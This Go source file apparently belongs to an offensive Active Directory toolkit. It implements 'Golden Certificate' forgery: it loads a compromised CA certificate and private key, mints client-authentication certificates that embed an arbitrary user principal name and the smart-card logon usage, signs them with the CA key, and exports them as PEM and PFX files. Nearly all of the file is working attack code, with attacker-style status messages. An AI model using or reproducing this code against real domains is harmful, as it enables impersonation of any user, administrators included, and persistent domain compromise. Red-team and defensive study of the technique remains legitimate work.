package pki

import (
	"crypto"
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net/url"
	"os"
	"strings"
	"time"

	"software.sslmate.com/src/go-pkcs12"
)

// upnOtherName encodes a UPN as an ASN.1 OtherName SAN extension value.
func upnOtherName(upn string) ([]byte, error) {
	// OID bytes for 1.3.6.1.4.1.311.20.2.3 (szOID_NT_PRINCIPAL_NAME)
	oidBytes := []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03}

	upnBytes := []byte(upn)
	utf8Val := derTLV(0x0c, upnBytes)
	explicit0 := derTLV(0xa0, utf8Val)
	otherNameSeq := append(oidBytes, explicit0...)

	generalName := derTLV(0xa0, otherNameSeq)
	return generalName, nil
}

// derTLV builds a DER tag-length-value encoding.
func derTLV(tag byte, value []byte) []byte {
	n := len(value)
	if n < 0x80 {
		out := make([]byte, 2+n)
		out[0] = tag
		out[1] = byte(n)
		copy(out[2:], value)
		return out
	}
	if n < 0x100 {
		out := make([]byte, 3+n)
		out[0] = tag
		out[1] = 0x81
		out[2] = byte(n)
		copy(out[3:], value)
		return out
	}
	out := make([]byte, 4+n)
	out[0] = tag
	out[1] = 0x82
	out[2] = byte(n >> 8)
	out[3] = byte(n)
	copy(out[4:], value)
	return out
}

// ForgeCertificate generates a self-signed certificate with the given UPN.
func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] Forging Golden Certificate for UPN: %s\n", upn)

	certKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to generate certificate key: %w", err)
	}

	cn := upn
	if u, err := url.Parse("user://" + upn); err == nil {
		if u.User.Username() != "" {
			cn = u.User.Username()
		}
	}

	upnSAN, err := upnOtherName(upn)
	if err != nil {
		return nil, nil, fmt.Errorf("encode UPN SAN: %w", err)
	}
	sanRaw := derTLV(0x30, upnSAN)

	template := &x509.Certificate{
		SerialNumber: big.NewInt(1337),
		Subject: pkix.Name{
			CommonName: cn,
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(1, 0, 0),
		IsCA:                  false,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		BasicConstraintsValid: true,
		ExtraExtensions: []pkix.Extension{
			{
				Id:       []int{2, 5, 29, 17},
				Critical: false,
				Value:    sanRaw,
			},
		},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &certKey.PublicKey, caKey)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to create certificate: %w", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to parse created certificate: %w", err)
	}

	fmt.Printf("[+] Certificate forged — CN=%s, valid until %s\n", cn, cert.NotAfter.Format("2006-01-02"))
	return cert, certKey, nil
}

// LoadCACertAndKey loads a CA certificate and private key from PEM files.
func LoadCACertAndKey(certPath, keyPath string) (*x509.Certificate, crypto.PrivateKey, error) {
	certData, err := os.ReadFile(certPath)
	if err != nil {
		return nil, nil, fmt.Errorf("read CA certificate %s: %w", certPath, err)
	}
	certBlock, _ := pem.Decode(certData)
	if certBlock == nil {
		return nil, nil, fmt.Errorf("no PEM block found in %s", certPath)
	}
	caCert, err := x509.ParseCertificate(certBlock.Bytes)
	if err != nil {
		return nil, nil, fmt.Errorf("parse CA certificate: %w", err)
	}

	keyData, err := os.ReadFile(keyPath)
	if err != nil {
		return nil, nil, fmt.Errorf("read CA key %s: %w", keyPath, err)
	}
	keyBlock, _ := pem.Decode(keyData)
	if keyBlock == nil {
		return nil, nil, fmt.Errorf("no PEM block found in %s", keyPath)
	}

	var caKey crypto.PrivateKey
	switch keyBlock.Type {
	case "EC PRIVATE KEY":
		caKey, err = x509.ParseECPrivateKey(keyBlock.Bytes)
	case "RSA PRIVATE KEY":
		caKey, err = x509.ParsePKCS1PrivateKey(keyBlock.Bytes)
	default:
		caKey, err = x509.ParsePKCS8PrivateKey(keyBlock.Bytes)
		if err != nil {
			if ecKey, ecErr := x509.ParseECPrivateKey(keyBlock.Bytes); ecErr == nil {
				caKey = ecKey
				err = nil
			} else if rsaKey, rsaErr := x509.ParsePKCS1PrivateKey(keyBlock.Bytes); rsaErr == nil {
				caKey = rsaKey
				err = nil
			}
		}
	}
	if err != nil {
		return nil, nil, fmt.Errorf("parse CA private key: %w", err)
	}

	fmt.Printf("[+] Loaded CA certificate: %s (issuer: %s)\n", caCert.Subject.CommonName, caCert.Issuer.CommonName)
	fmt.Printf("[+] Loaded CA private key from %s\n", keyPath)
	return caCert, caKey, nil
}

// ForgeGoldenCertificate generates a certificate signed by a real CA key.
func ForgeGoldenCertificate(caKey crypto.PrivateKey, caCert *x509.Certificate, upn string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] Forging Golden Certificate (CA-signed) for UPN: %s\n", upn)
	fmt.Printf("[*] CA Subject: %s\n", caCert.Subject.CommonName)

	certKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, fmt.Errorf("generate certificate key: %w", err)
	}

	cn := upn
	if idx := strings.IndexByte(upn, '@'); idx >= 0 {
		cn = upn[:idx]
	}

	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return nil, nil, fmt.Errorf("generate serial number: %w", err)
	}

	upnSAN, err := upnOtherName(upn)
	if err != nil {
		return nil, nil, fmt.Errorf("encode UPN SAN: %w", err)
	}
	sanRaw := derTLV(0x30, upnSAN)

	template := &x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			CommonName: cn,
		},
		NotBefore:             time.Now().Add(-10 * time.Minute),
		NotAfter:              time.Now().AddDate(1, 0, 0),
		IsCA:                  false,
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		BasicConstraintsValid: true,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		UnknownExtKeyUsage: []asn1.ObjectIdentifier{
			{1, 3, 6, 1, 4, 1, 311, 20, 2, 2},
		},
		ExtraExtensions: []pkix.Extension{
			{
				Id:       []int{2, 5, 29, 17},
				Critical: false,
				Value:    sanRaw,
			},
		},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, caCert, &certKey.PublicKey, caKey)
	if err != nil {
		return nil, nil, fmt.Errorf("create CA-signed certificate: %w", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, nil, fmt.Errorf("parse created certificate: %w", err)
	}

	fmt.Printf("[+] Golden certificate forged — CN=%s, Serial=%s\n", cn, cert.SerialNumber.Text(16))
	return cert, certKey, nil
}

// WriteCertKeyPEM writes a certificate and its private key to separate PEM files.
func WriteCertKeyPEM(cert *x509.Certificate, key crypto.Signer, basePath string) error {
	certPath := basePath + ".crt"
	keyPath := basePath + ".key"

	certFile, err := os.Create(certPath)
	if err != nil {
		return fmt.Errorf("create cert file: %w", err)
	}
	defer certFile.Close()
	if err := pem.Encode(certFile, &pem.Block{Type: "CERTIFICATE", Bytes: cert.Raw}); err != nil {
		return fmt.Errorf("encode cert PEM: %w", err)
	}

	keyDER, err := x509.MarshalPKCS8PrivateKey(key)
	if err != nil {
		return fmt.Errorf("marshal private key: %w", err)
	}
	keyFile, err := os.Create(keyPath)
	if err != nil {
		return fmt.Errorf("create key file: %w", err)
	}
	defer keyFile.Close()
	if err := pem.Encode(keyFile, &pem.Block{Type: "PRIVATE KEY", Bytes: keyDER}); err != nil {
		return fmt.Errorf("encode key PEM: %w", err)
	}

	fmt.Printf("[+] Certificate written to: %s\n", certPath)
	fmt.Printf("[+] Private key written to:  %s\n", keyPath)
	return nil
}

// WritePFX writes a PKCS12/PFX archive containing the certificate and private key.
func WritePFX(cert *x509.Certificate, key crypto.Signer, path, password string) error {
	pfxData, err := pkcs12.Encode(rand.Reader, key, cert, nil, password)
	if err != nil {
		return fmt.Errorf("encode PFX: %w", err)
	}
	if err := os.WriteFile(path, pfxData, 0600); err != nil {
		return fmt.Errorf("write PFX: %w", err)
	}
	fmt.Printf("[+] PFX written to: %s\n", path)
	return nil
}

// WriteCertPEM writes a certificate to a PEM file.
func WriteCertPEM(cert *x509.Certificate, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer file.Close()

	block := &pem.Block{Type: "CERTIFICATE", Bytes: cert.Raw}
	if err := pem.Encode(file, block); err != nil {
		return fmt.Errorf("failed to write PEM: %w", err)
	}
	return nil
}

// WriteECPrivateKey writes an ECDSA private key to a writer in PEM format.
func WriteECPrivateKey(w io.Writer, key *ecdsa.PrivateKey) error {
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return fmt.Errorf("marshal EC key: %w", err)
	}
	return pem.Encode(w, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
}
